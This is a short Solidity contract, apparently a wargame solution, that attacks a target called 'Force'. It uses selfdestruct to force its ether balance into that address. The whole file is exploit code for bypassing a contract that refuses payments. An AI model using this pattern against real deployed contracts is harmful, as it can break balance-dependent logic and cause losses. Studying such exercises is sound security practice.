// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

/*
    * Contract which is used to attack the Force contract
*/
contract ForceAttack {

     constructor() payable {
         
     }

    // Send the balance of this contract to _contract
    function attack(address payable _contract) public {
        selfdestruct(_contract);
    }    
}